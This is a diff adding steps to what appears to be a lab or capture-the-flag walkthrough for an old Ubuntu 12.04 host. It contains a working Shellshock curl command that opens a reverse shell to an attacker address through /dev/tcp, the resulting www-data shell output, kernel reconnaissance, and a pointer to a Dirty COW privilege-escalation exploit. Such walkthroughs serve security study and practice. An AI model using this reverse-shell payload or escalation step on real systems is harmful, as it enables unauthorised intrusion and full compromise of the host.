@@ -76,6 +76,45 @@ we just need to execute a reverse shell command to get the shell
 
 ### 3.Gaining Shell
 
+Use the below command to get the shell :
+
+```bash
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.127.128/4444 0>&1' http://192.168.127.133/cgi-bin/test
+```
+
+```bash
+www-data@ubuntu:/var/www$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### 4.Privilege Escalation
+
+Since this is an old machine, we can use dirtycow exploit :
+
+```bash
+www-data@ubuntu:/var/www$ uname -a
+Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+
+www-data@ubuntu:/var/www$ cat /etc/*-release
+cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=12.04
+DISTRIB_CODENAME=precise
+DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
+```
+
+use `dirtycow.c` from [here](https://github.com/firefart/dirtycow/blob/master/dirty.c)
+
+
+
+
+
+
+
+
+
+
 
 
 
